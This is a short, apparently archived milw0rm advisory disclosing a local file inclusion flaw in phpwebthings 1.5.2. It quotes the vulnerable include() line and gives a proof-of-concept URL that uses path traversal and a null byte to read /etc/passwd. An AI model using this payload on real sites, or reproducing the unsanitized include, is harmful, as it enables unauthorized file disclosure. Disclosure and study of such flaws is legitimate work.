@@ -1,0 +1,49 @@
+----------------------------------------------------------------------------------------------------
+
+  Name : phpwebthings <= 1.5.2
+  Site : http://sourceforge.net/projects/phpwebthings/
+
+  Down : http://sourceforge.net/project/downloading.php?group_id=19103&filename=phpwebthings_1_5_2.zip&a=46042396
+
+
+----------------------------------------------------------------------------------------------------
+
+ 
+  Found By : br0ly
+  Made in  : Brasil
+  Contact  : br0ly[dot]Code[at]gmail[dot]com
+
+----------------------------------------------------------------------------------------------------
+
+
+  Description:
+
+  Bug : Local File Inclusion
+ 
+  Look this: 
+
+    <?php           theme_draw_centerbox_open("Help");
+    if (isset($_GET["module"])) include("modules/{$_GET["module"]}/lang/help_{$cfg["core"]["lang"]}.php"); <-- Vul 
+
+                else include("lang/help_{$cfg["core"]["lang"]}.php");
+
+
+
+  If magic_quotes_gpc=off --> LFI;  
+
+
+
+----------------------------------------------------------------------------------------------------
+
+
+  P0c:
+ 
+    LFI:http://localhost/Scripts/phpwebthings_1_5_2/help?module=../../../../../../../../../../../../etc/passwd%00
+
+
+
+  OBS: need register_globals=on;
+
+----------------------------------------------------------------------------------------------------
+
+# milw0rm.com [2009-06-11]
